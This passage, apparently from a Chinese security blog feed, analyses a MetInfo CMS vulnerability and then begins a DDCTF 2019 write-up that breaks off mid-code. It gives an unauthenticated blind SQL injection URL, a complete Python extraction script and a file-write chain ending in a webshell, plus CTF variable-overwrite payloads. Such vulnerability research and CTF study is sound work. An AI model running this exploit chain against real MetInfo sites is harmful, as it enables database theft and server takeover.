class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqlinsert</span><span class="params">($string)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(is_array($string))&#123;</span><br><span class="line"><span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">$string[$key] = sqlinsert($val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$string_old = $string;</span><br><span class="line">$string = str_ireplace(<span class="string">"\\"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"\""</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"'"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"*"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"%5C"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"%22"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"%27"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"%2A"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"~"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"select"</span>, <span class="string">"\sel\ect"</span>, $string);</span><br><span class="line">$string = str_ireplace(<span class="string">"insert"</span>, <span class="string">"\ins\ert"</span>, $string);</span><br><span class="line">$string = str_ireplace(<span class="string">"update"</span>, <span class="string">"\up\date"</span>, $string);</span><br><span class="line">$string = str_ireplace(<span class="string">"delete"</span>, <span class="string">"\de\lete"</span>, $string);</span><br><span class="line">$string = str_ireplace(<span class="string">"union"</span>, <span class="string">"\un\ion"</span>, $string);</span><br><span class="line">$string = str_ireplace(<span class="string">"into"</span>, <span class="string">"\in\to"</span>, $string);</span><br><span class="line">$string = str_ireplace(<span class="string">"load_file"</span>, <span class="string">"\load\_\file"</span>, $string);</span><br><span class="line">$string = str_ireplace(<span class="string">"outfile"</span>, <span class="string">"\out\file"</span>, $string);</span><br><span class="line">$string = str_ireplace(<span class="string">"sleep"</span>, <span class="string">"\sle\ep"</span>, $string);</span><br><span class="line">$string = strip_tags($string);</span><br><span class="line"><span class="keyword">if</span>($string_old!=$string)&#123;</span><br><span class="line">$string=<span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">$string = trim($string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是细看代码发现在过滤之前，字符串先经过了 daddslashes 函数，而 daddslashes 函数是否执行 sqlinsert 则由 IN_ADMIN 来决定</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">daddslashes</span><span class="params">($string, $force = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">!defined(<span class="string">'MAGIC_QUOTES_GPC'</span>) &amp;&amp; define(<span class="string">'MAGIC_QUOTES_GPC'</span>, get_magic_quotes_gpc());</span><br><span class="line"><span class="keyword">if</span>(!MAGIC_QUOTES_GPC || $force) &#123;</span><br><span class="line"><span class="keyword">if</span>(is_array($string)) &#123;</span><br><span class="line"><span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">$string[$key] = daddslashes($val, $force);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(!defined(<span class="string">'IN_ADMIN'</span>))&#123;</span><br><span class="line">$string = trim(addslashes(sqlinsert($string)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$string = trim(addslashes($string));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 IN_ADMIN 常量为 true 时，我们的字符串只会进行简单的 addslashes 转义，存在 sql注入，随即全局搜索 IN_ADMIN 常量，在/admin/index.php发现如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'IN_ADMIN'</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//�ӿ�</span></span><br><span class="line">$M_MODULE=<span class="string">'admin'</span>;</span><br><span class="line"><span class="keyword">if</span>(@$_GET[<span class="string">'m'</span>])$M_MODULE=$_GET[<span class="string">'m'</span>];</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'n'</span>])$_GET[<span class="string">'n'</span>]=<span class="string">"index"</span>;</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'c'</span>])$_GET[<span class="string">'c'</span>]=<span class="string">"index"</span>;</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'a'</span>])$_GET[<span class="string">'a'</span>]=<span class="string">"doindex"</span>;</span><br><span class="line">@define(<span class="string">'M_NAME'</span>, $_GET[<span class="string">'n'</span>]);</span><br><span class="line">@define(<span class="string">'M_MODULE'</span>, $M_MODULE);</span><br><span class="line">@define(<span class="string">'M_CLASS'</span>, $_GET[<span class="string">'c'</span>]);</span><br><span class="line">@define(<span class="string">'M_ACTION'</span>, $_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../app/system/entrance.php'</span>;</span><br></pre></td></tr></table></figure><p>我们不但可以得到值为 true 的 IN_ADMIN 常量，而且还可以在这里调用任意do开头的方法，无需登录，所以我们可以利用 domessage 类方法传入 action = add 来进行 sql注入</p><p>通过分析 /app/system/entrance.php 构造利用链，我们需要的是 /app/system/message/web/message.class.php，需传入 M_NAME = message，将 M_TYPE 常量值设为  system，M_MODULE 传入值为 web，此时 PATH_OWN_FILE 常量为 /app/system/message/web/，然后 entrance.php 执行 <code>load::module();</code> 加载 message 模块并传入参数，达到绕过 sqlinsert 执行 add 函数的目的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">module</span><span class="params">($path = <span class="string">''</span>, $modulename = <span class="string">''</span>, $action = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!$path) &#123;</span><br><span class="line"><span class="keyword">if</span> (!$path) $path = PATH_OWN_FILE;</span><br><span class="line"><span class="keyword">if</span> (!$modulename) $modulename = M_CLASS;</span><br><span class="line"><span class="keyword">if</span> (!$action) $action = M_ACTION;</span><br><span class="line"><span class="keyword">if</span> (!$action) $action = <span class="string">'doindex'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">self</span>::_load_class($path, $modulename, $action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>http://127.0.0.1:23332//admin/index.php?n=message&amp;m=web&amp;c=message&amp;a=domessage&amp;action=add&amp;lang=cn&amp;para137=1&amp;para186=1&amp;para138=1&amp;para139=1&amp;para140=1&amp;id=1%20or%20sleep(1)</code></p><p>这里代码判断反馈与验证码都在sql语句的后面，所以我们可以借助页面的不同回显进行 bool 盲注，区别是返回的 value 的有无，通过查询数据库，我们可以注入 columnid 为 44 或 42</p><p> <img src="https://i.loli.net/2019/04/30/5cc84dc661df9.png" alt></p><p> 脚本注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://&#123;&#125;/admin/index.php?n=message&amp;m=web&amp;c=message&amp;a=domessage&amp;action=add&amp;lang=cn&amp;para137=1&amp;para186=1&amp;para138=1&amp;para139=1&amp;para140=1&amp;id="</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_res_len</span><span class="params">(host,sql)</span>:</span></span><br><span class="line"><span class="keyword">global</span> url</span><br><span class="line">url = url.format(host)</span><br><span class="line">max_len = <span class="number">101</span></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,max_len):</span><br><span class="line">check_sql = <span class="string">"44 and(length((&#123;&#125;))=&#123;&#125;)"</span>.format(sql,str(i))</span><br><span class="line">res = s.get(url+check_sql)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"window.history.back()"</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"data too long"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sqli_data</span><span class="params">(host,sql)</span>:</span></span><br><span class="line"><span class="keyword">global</span> url</span><br><span class="line">data_len = get_res_len(host,sql)</span><br><span class="line">sqli = <span class="string">"44 and(ascii(substr((&#123;&#125;),&#123;&#125;,1)))=&#123;&#125;"</span></span><br><span class="line">data = <span class="string">""</span></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(data_len+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string.printable[<span class="number">0</span>:<span class="number">62</span>]:</span><br><span class="line">res = s.get(url+sqli.format(sql,str(i),ord(c)))</span><br><span class="line"><span class="keyword">if</span> <span class="string">"window.history.back()"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">data += c</span><br><span class="line"><span class="keyword">print</span> (data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">host = <span class="string">"127.0.0.1:23332"</span></span><br><span class="line">sql = <span class="string">"select value from met_config where id = 45"</span></span><br><span class="line">get_sqli_data(host,sql)</span><br></pre></td></tr></table></figure><p> 通过查询数据库得知 met_member_force 的 id 是 45，注入得到 met_member_force 值</p><p><img src="https://i.loli.net/2019/04/30/5cc84f98dd2a0.png" alt></p><p> 再回到任意文件写入上来，拿到了 met_member_force，下面寻找可控的页面输出，全局搜索 extends web 寻找 web 的子类，其子类并不多，而且找到的大多为查数据库得到的配置参数或是一些固定输出，利用难度较大，较可行的应该就是 uploadify 这个子类了，类方法中有多处 echo jsonencode</p><p> 其中在 doupfile 函数中，<code>$back</code> 从表单中获取文件名，最后做 jsonencode 操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doupfile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $_M;</span><br><span class="line"></span><br><span class="line">. . . . </span><br><span class="line"></span><br><span class="line">$back = <span class="keyword">$this</span>-&gt;upload($_M[<span class="string">'form'</span>][<span class="string">'formname'</span>]);</span><br><span class="line"></span><br><span class="line">. . . .</span><br><span class="line"></span><br><span class="line">   $back[<span class="string">'filesize'</span>] =  round(filesize($back[<span class="string">'path'</span>])/<span class="number">1024</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> jsonencode($back);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向上回溯，由自身的 upload 方法调用了 upfile 的 upload 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($formname)</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $_M;</span><br><span class="line">$back = <span class="keyword">$this</span>-&gt;upfile-&gt;upload($formname);</span><br><span class="line"><span class="keyword">return</span> $back;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>$_FILES</code>上传文件属性传给<code>$filear</code>数组保存</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($form = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $_M;</span><br><span class="line"><span class="keyword">if</span>($form)&#123;</span><br><span class="line"><span class="keyword">foreach</span>($_FILES <span class="keyword">as</span> $key =&gt; $val)&#123;</span><br><span class="line"><span class="keyword">if</span>($form == $key)&#123;</span><br><span class="line">$filear = $_FILES[$key];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$filear)&#123;</span><br><span class="line"><span class="keyword">foreach</span>($_FILES <span class="keyword">as</span> $key =&gt; $val)&#123;</span><br><span class="line">$filear = $_FILES[$key];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面对<code>$filear</code>进行处理后缀名处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;getext($filear[<span class="string">"name"</span>]); <span class="comment">//获取允许的后缀</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getext</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($filename == <span class="string">""</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$ext = explode(<span class="string">"."</span>, $filename);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ext = $ext[count($ext)<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件名如果无<code>.</code>，则取上传文件名即为拓展名的值，下面检查拓展名的时候就可能会出错</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件后缀是否为合法后缀</span></span><br><span class="line"><span class="keyword">if</span> ($_M[<span class="string">'config'</span>][<span class="string">'met_file_format'</span>]) &#123;</span><br><span class="line"><span class="keyword">if</span>($_M[<span class="string">'config'</span>][<span class="string">'met_file_format'</span>] != <span class="string">""</span> &amp;&amp; !in_array(strtolower(<span class="keyword">$this</span>-&gt;ext)explode(<span class="string">'|'</span>,strtolower($_M[<span class="string">'config'</span>][<span class="string">'met_file_format'</span>]))) &amp;&amp; $filear)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error(<span class="keyword">$this</span>-&gt;ext.<span class="string">" &#123;$_M['word']['upfileTip3']&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据库中的拓展名白名单如下</p><p><img src="https://i.loli.net/2019/05/01/5cc9a35161e10.png" alt></p><p>上面代码能看出，如果后缀检查有错误，会调用error函数处理，而且传入参数为<strong>拓展名的值+错误信息</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">error</span><span class="params">($error)</span></span>&#123;</span><br><span class="line">$back[<span class="string">'error'</span>] = <span class="number">1</span>;</span><br><span class="line">$back[<span class="string">'errorcode'</span>] = $error;</span><br><span class="line"><span class="keyword">return</span> $back;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而且 拓展名的值+错误信息 被赋值给了 back，最终在 doupfile 函数中被输出，web 类析构函数将输出缓冲写入文件</p><p>文件内容如下 </p><p><img src="https://i.loli.net/2019/05/01/5cc9a7af84a5e.png" alt></p><p>由于文件名与内容可控，注册账号上传图片，然后抓包修改为doupfile方法，根据最开始web.class.php中 file_put_contents 的条件，传入 metinfonow=pjovehc和html_filename文件名，就可以直接写入到web根目录</p><p> <img src="https://i.loli.net/2019/05/01/5cc99c2e2c61b.png" alt></p><p> 成功 GetShell</p><p> <img src="https://i.loli.net/2019/04/30/5cc861ceee60a.png" alt></p><p>Reference:</p><p><a href="https://nosec.org/home/detail/2324.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2324.html</a><br><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=46687&amp;highlight=metinfo" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=46687&amp;highlight=metinfo</a><br><a href="https://mochazz.github.io/2018/11/09/Metinfo6.0.0-6.1.2%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%94%9F%E5%91%BD%E7%BA%BF/" target="_blank" rel="noopener">https://mochazz.github.io/2018/11/09/Metinfo6.0.0-6.1.2%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%94%9F%E5%91%BD%E7%BA%BF/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://j0k3r.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF 2019 WriteUp</title>
    <link href="http://j0k3r.top/2019/04/22/ddctf2019/"/>
    <id>http://j0k3r.top/2019/04/22/ddctf2019/</id>
    <published>2019-04-21T16:00:00.000Z</published>
    <updated>2019-04-22T11:51:49.223Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><h2 id="滴～"><a href="#滴～" class="headerlink" title="滴～"></a>滴～</h2><p>读 index.php 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在给的博客 <a href="https://blog.csdn.net/FengBanLiuYun/article/details/80616607" target="_blank" rel="noopener">https://blog.csdn.net/FengBanLiuYun/article/details/80616607</a> 中找到 <a href="https://blog.csdn.net/FengBanLiuYun/article/details/80913909" target="_blank" rel="noopener">https://blog.csdn.net/FengBanLiuYun/article/details/80913909</a></p><p>practice.txt.swp 得到</p><p>f1ag!ddctf.php</p><p>转 hex 加两次 base64 读 f1ag!ddctf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>变量覆盖</p><p>payload： <code>http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=</code></p><p>flag</p><p><code>DDCTF{436f6e67726174756c6174696f6e73}</code></p><hr><h2 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h2><p>由 index.js 发现 auth() 函数中的 ajax 请求</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: didi</span></span><br><span class="line"><span class="comment"> * Date: 2019/1/13</span></span><br><span class="line"><span class="comment"> * Time: 9:05 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"post"</span>,</span><br><span class="line">        url:<span class="string">"http://117.51.158.44/app/Auth.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/json;charset=utf-8"</span>,</span><br><span class="line">        dataType: <span class="string">"json"</span>,</span><br><span class="line">        beforeSend: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) </span>&#123;</span><br><span class="line">            XMLHttpRequest.setRequestHeader(<span class="string">"didictf_username"</span>, <span class="string">""</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">getdata</span>) </span>&#123;</span><br><span class="line">           <span class="built_in">console</span>.log(getdata);</span><br><span class="line">           <span class="keyword">if</span>(getdata.data !== <span class="string">''</span>) &#123;</span><br><span class="line">               <span class="built_in">document</span>.getElementById(<span class="string">'auth'</span>).innerHTML = getdata.data;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,<span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>burpsuite 抓包带 didictf_username header 头请求 app/Auth.php</p><p>测试当 didictf_username 为 admin 时返回 success 的 json 数据，得到 app/fL2XID2i0Cdh.php</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"errMsg"</span>:<span class="string">"success"</span>,<span class="attr">"data"</span>:<span class="string">"\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458----\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php"</span>&#125;</span><br></pre></td></tr></table></figure><p>访问能得到 app/Application.php 和 app/Session.php 源码</p><p>app/Application.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 